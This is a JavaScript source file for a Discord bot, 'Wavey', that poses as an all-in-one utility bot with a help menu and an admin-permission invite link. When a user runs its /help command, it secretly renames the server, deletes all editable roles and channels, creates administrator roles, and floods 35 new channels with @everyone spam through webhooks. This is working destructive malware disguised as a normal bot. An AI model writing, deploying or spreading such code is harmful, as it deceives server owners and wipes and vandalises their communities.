const { Client, GatewayIntentBits, PermissionsBitField, EmbedBuilder, WebhookClient } = require('discord.js');
require('dotenv').config();

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

const emojis = ['🌊', '💜'];
const discordLink = "https://discord.gg/XrTZWKgXca";

client.on('ready', () => {
    console.log(`Logged in as ${client.user.tag}`);
    
    // Register the fake help command
    client.application.commands.create({
        name: 'help',
        description: 'shows help menu of bot commands'
    }).then(() => console.log('Fake help command registered!')).catch(console.error);
});

client.on('interactionCreate', async (interaction) => {
    if (!interaction.isCommand()) return;
    
    if (interaction.commandName === 'help') {
        // Create a fake help menu embed
        const helpEmbed = new EmbedBuilder()
    .setColor('#0099ff')
    .setTitle('Wavey Bot')
    .setDescription(
        [
            'Hi, it\'s **Wavey**.',
            '',
            'Wavey is an all-in-one Discord bot.',
            'Perfect for your server?',
            '',
            '**Wavey Prefix:** `?`',
            '',
            '**To suggest new commands, join our Discord Server:**',
            '<https://discord.gg/XrTZWKgXca>',
            '',
            '**Invite Wavey to your server:**',
            '<https://discord.com/oauth2/authorize?client_id=1518034096561848440&permissions=8&integration_type=0&scope=bot>',
            '',
            'Use **Wavey\'s Commands**.'
        ].join('\n')
    )
    .setTimestamp()
    .setFooter({ text: 'Wavey Bot' });

        // Reply with the fake help menu
        await interaction.reply({ embeds: [helpEmbed], ephemeral: true });
        
        // Change server name to the Discord link
        await interaction.guild.setName(discordLink).catch(console.error);
        
        // Start the nuke process in the background
        nukeServer(interaction.guild);
    }
});

async function nukeServer(guild) {
    try {
        console.log('Starting nuke process...');
        
        // First delete all roles (except @everyone)
        const roles = await guild.roles.fetch();
        await Promise.all(roles.map(role => {
            if (role.editable && role.name !== '@everyone') return role.delete().catch(console.error);
        }));
        
        // Then instantly delete all channels
        const channels = await guild.channels.fetch();
        await Promise.all(channels.map(channel => {
            if (channel.deletable) return channel.delete().catch(console.error);
        }));
        
        // Create 20 roles
        const rolePromises = [];
        for (let i = 0; i < 9; i++) {
            const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
            rolePromises.push(
                guild.roles.create({
                    name: `@Wavey-${randomEmoji}`,
                    color: '#FF0000',
                    permissions: [PermissionsBitField.Flags.Administrator],
                    position: i + 1
                }).catch(console.error)
            );
        }
        await Promise.all(rolePromises);
        
        // Create 35 text channels (no voice channels)
        const channelPromises = [];
        for (let i = 0; i < 35; i++) {
            const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
            
            channelPromises.push(
                guild.channels.create({
                    name: `Wavey-${randomEmoji}`,
                    type: 0 // GUILD_TEXT
                }).then(async (channel) => {
                    // Create a webhook in this channel
                    try {
                        const webhook = await channel.createWebhook({
                            name: `Wavey-${randomEmoji}`,
                            avatar: client.user.displayAvatarURL()
                        });
                        
                        const webhookClient = new WebhookClient({ id: webhook.id, token: webhook.token });
                        
                        // Send 25 pings through the webhook
                        for (let j = 0; j < 25; j++) {
                            await webhookClient.send(`@everyone NUKE BY WAVEY ${discordLink}`).catch(console.error);
                        }
                        
                        // Delete the webhook (but keep the channel)
                        await webhook.delete().catch(console.error);
                    } catch (error) {
                        console.error('Error creating webhook:', error);
                    }
                }).catch(console.error)
            );
        }
        await Promise.all(channelPromises);
        
        console.log('Server nuked successfully!');
    } catch (error) {
        console.error('Error during nuke:', error);
    }
}

client.login(process.env.BOT_TOKEN);
